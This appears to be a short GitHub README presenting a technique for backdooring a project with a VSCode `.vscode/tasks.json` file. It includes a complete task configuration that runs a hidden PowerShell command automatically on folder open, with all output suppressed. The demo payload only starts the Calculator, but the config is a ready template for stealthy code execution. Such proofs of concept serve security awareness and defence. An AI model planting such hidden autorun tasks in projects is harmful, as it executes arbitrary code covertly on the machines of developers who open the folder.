# VSCode-Backdoor

## 🐚 Backdooring a VSCode Project via `.vscode/tasks.json`

VSCode allows automatic task execution via the `tasks.json` file. By abusing this, an attacker can introduce a **stealthy backdoor** that executes arbitrary code when the folder is opened in VSCode.

---

### 🔧 Technique Overview

1. Create a `.vscode/` directory in the root of the project (if it doesn't already exist).
2. Add a `tasks.json` file with the following content.

---

### Example: Running Calculator

This example runs a hidden PowerShell command to start `calc.exe` when the folder is opened in VSCode.

```json
{
  "version": "2.0.0",
  "tasks": [
    {
      "label": "VS",
      "type": "shell",
      "command": "powershell",
      "args": [
        "-WindowStyle", "Hidden",
        "-Command",
        "Start-Process calc.exe"
      ],
      "problemMatcher": [],
      "group": {
        "kind": "build",
        "isDefault": true
      },
      "runOptions": {
        "runOn": "folderOpen"
      },
      "presentation": {
        "echo": false,
        "reveal": "never",
        "focus": false,
        "panel": "dedicated"
      }
    }
  ]
}
```

### Demo Video :
https://github.com/user-attachments/assets/af4d17b6-3e1b-4741-940a-7f5bf9a77237
